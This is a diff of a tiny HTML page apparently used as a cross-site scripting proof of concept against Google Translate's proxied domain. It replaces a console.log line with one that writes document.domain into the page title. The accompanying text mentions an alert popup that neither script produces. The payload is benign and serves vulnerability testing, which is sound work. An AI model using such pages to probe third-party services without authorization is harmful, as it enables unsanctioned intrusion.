@@ -2,7 +2,7 @@
 <body>
 <h1>Google Translate XSS PoC</h1>
 <script>
-console.log("XSS CONFIRMED: " + document.domain);
+document.title = "XSS-" + document.domain;
 </script>
 <p>If you see an alert popup showing "translate.goog" in the domain, XSS is confirmed.</p>
 </body>
